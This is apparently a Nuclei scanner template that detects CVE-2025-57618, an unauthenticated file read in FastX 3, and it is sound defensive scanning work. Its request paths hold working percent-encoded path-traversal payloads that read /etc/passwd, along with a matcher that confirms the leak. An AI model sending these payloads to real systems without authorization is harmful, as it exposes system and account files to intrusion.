id: fastx3-error-assets-file-read

info:
  name: FastX 3 - Unauthenticated Arbitrary File Read via /error/assets/
  author: bandrel
  severity: high
  description: |
    FastX 3 before 3.3.71 serves `/error/assets/:myfile` by passing the route
    parameter to `path.resolve` without validation, so an unauthenticated
    client can read any file the service account can read. The template asks
    for /etc/passwd with the percent-encoded absolute form first, then the
    relative dot-segment form at depths 9-12.

    A patched 3.3.71 rejects with HTTP 200 and an empty body, the same response
    as "file not found", so the status code alone proves nothing. The matcher
    requires /etc/passwd content in the body.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-57618
  classification:
    cve-id: CVE-2025-57618
  metadata:
    verified: true
    max-request: 5
    product: fastx
    vendor: starnet
  tags: cve,cve2025,fastx,starnet,lfi,unauth

http:
  - method: GET
    path:
      - "{{BaseURL}}/error/assets/%2fetc%2fpasswd"
      - "{{BaseURL}}/error/assets/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
      - "{{BaseURL}}/error/assets/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
      - "{{BaseURL}}/error/assets/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
      - "{{BaseURL}}/error/assets/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - "root:[^:\\n]*:0:0:"
